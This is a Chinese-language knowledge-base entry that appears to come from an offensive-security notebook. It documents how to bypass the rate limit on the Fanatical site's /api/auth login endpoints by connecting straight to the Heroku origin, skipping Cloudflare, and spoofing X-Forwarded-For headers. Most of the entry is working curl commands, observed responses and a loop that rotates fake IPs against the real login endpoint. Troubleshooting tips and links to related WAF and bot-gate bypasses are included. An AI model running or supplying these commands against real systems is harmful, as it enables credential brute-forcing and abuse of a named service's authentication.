# Fanatical /api/auth/* 令牌桶限速绕过（Heroku 源站直连 + 伪造 X-Forwarded-For）

## 0. 适用面与原理
- 目标：Fanatical（www.fanatical.com / admin.fanatical.com），后端为同一 Heroku 应用（响应头 `server: Heroku`、`via: 2.0 heroku-router`），前置 Cloudflare（www 侧还有 Cloudflare Worker，`x-is-cf-worker: 1`）。
- 现象：`/api/auth/*` 全族（`login` / `register` / `magic/summon` / `magic/cast` / `recaptcha` / `two-factor` …）共享**同一个应用层令牌桶**，按源 IP 计数。经 CF 访问时，边缘会覆盖/规范化 `X-Forwarded-For`，所以伪造 XFF 无效，全族一起 429。
- 绕过：绕过 Cloudflare 直连 Heroku GA 源站（`--resolve` + 自定义域 `Host`），应用层拿到的就是客户端原始 XFF，令牌桶 key 随之变成攻击者任意指定的 IP → 每个请求换一个新桶。
- 边界：只绕过限速，**不绕过 reCAPTCHA**。202 的 body 是 `{"type":"reCaptcha","challengeId":"...","action":"LOGIN"}`，表示请求进入业务逻辑，不代表登录成功/账号接管。

## 1. 前置条件
| 项 | 要求 |
|---|---|
| 网络 | 可出网 443；**直连** Heroku GA 源站（不经 Cloudflare） |
| 代理 | 本机若有 HTTP 代理，必须 `--noproxy '*'`，否则代理自己解析 DNS，`--resolve` 失效、请求回到 CF |
| 请求头 | `anonid: <UUIDv4>`（缺失 → 400 `Request blocked`）；浏览器类 UA（裸 `curl/x.y` → 403 `Request blocked`） |
| 请求头 | `X-Forwarded-For: <任意公网 IP>`，每个请求换一个 |
| 凭据 | 不需要 |

## 2. 取源站 IP（GA IP 会变，用前现取）
```bash
nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1
# 实测曾返回：3.33.161.45 / 13.248.131.213 / 15.197.152.254 / 35.71.150.51
# 同应用 www 侧也可用：nslookup -type=A www.fanatical.com.herokudns.com 1.1.1.1
```

## 3. 基线：经 Cloudflare → 429
```bash
UA="$ARTEX_UA"
ANON=$(cat /proc/sys/kernel/random/uuid)

curl -sk -A "$UA" \
  -H "anonid: $ANON" \
  -H 'Content-Type: application/json' \
  -X POST -d '{"email":"support@fanatical.com","password":"WrongPass123!"}' \
  https://www.fanatical.com/api/auth/login
# 期望：HTTP/2 429
# 同一时刻 login / register / magic/summon 也全 429 → 证明共享一个桶
```

## 4. 绕过：直连源站 + 伪造 XFF → 202
```bash
curl -sk --noproxy '*' \
  --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" \
  -H 'Host: admin.fanatical.com' \
  -H "anonid: $ANON" \
  -H 'X-Forwarded-For: 203.0.113.201' \
  -H 'Content-Type: application/json' \
  -X POST -d '{"email":"support@fanatical.com","password":"WrongPass123!"}' \
  https://admin.fanatical.com/api/auth/login
# 实测：HTTP/1.1 202
# {"type":"reCaptcha","challengeId":"d6bc8bb1-...","action":"LOGIN"}
```

## 5. 阴性对照（必做）
```bash
# 同一直连、同 payload，只去掉 X-Forwarded-For
curl -sk --noproxy '*' \
  --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: admin.fanatical.com' -H "anonid: $ANON" \
  -H 'Content-Type: application/json' \
  -X POST -d '{"email":"support@fanatical.com","password":"WrongPass123!"}' \
  https://admin.fanatical.com/api/auth/login
# 实测：HTTP/1.1 429
```
→ 直连本身不放行，放行来自 XFF 换桶，结论成立。

## 6. 批量换桶（验证可持续）
```bash
for i in $(seq 1 20); do
  XFF="203.0.$((113 + i % 2)).$((10 + i))"
  code=$(curl -sk --noproxy '*' -o /dev/null -w '%{http_code}' \
    --resolve admin.fanatical.com:443:3.33.161.45 \
    -A "$UA" -H 'Host: admin.fanatical.com' \
    -H "anonid: $ANON" -H "X-Forwarded-For: $XFF" \
    -H 'Content-Type: application/json' \
    -X POST -d '{"email":"probe-'"$i"'@example.com","password":"WrongPass123!"}' \
    https://admin.fanatical.com/api/auth/login)
  echo "$XFF $code"
done
# 实测：连续 10+ 次全部 202/404 业务响应，无一次 429
```

## 7. 判据
1. 同一时间窗内：无 XFF → 429，带任意 XFF → 202（或该端点自身的业务响应），稳定二分。
2. 换 N 个不同 XFF 连续请求 N 次，全程无 429。
3. 只直连不加 XFF 仍 429 → 说明桶仍按真实源 IP 计数，进一步坐实 key 取自 XFF。

## 8. 失败常见原因
- **走了代理**：`--resolve` 被代理重解析，请求回到 Cloudflare，XFF 被边缘覆盖 → 继续 429。必须 `--noproxy '*'`。
- **缺 anonid** → 400 `Request blocked`（应用层 bot 门禁，与本限速无关）。
- **UA 是 curl/x.y** → 边缘 403 `Request blocked`。
- **GA IP 过期**：Heroku GA IP 动态分配，超时/证书不匹配就重新 `nslookup *.herokudns.com`。
- **应用已收紧 trust proxy**（只信任 CF 网段）→ 直连也拿不到 XFF 影响，本手法失效；此时改从其他未受信前置回源。
- **误读 202**：202 + `type:reCaptcha` 只代表进入业务逻辑；真正登录仍要过 reCAPTCHA 与口令校验。

## 9. 关联条目
- kb#509：Heroku 源站直连绕过 Cloudflare Access/WAF（本条的直连前置手法、GA IP 取法与 `--noproxy '*'` 纪律）。
- kb#11：express-rate-limit 通用 XFF 换 key 方法论。
- kb#538：Fanatical `anonid` 头绕过 `Request blocked` 门禁。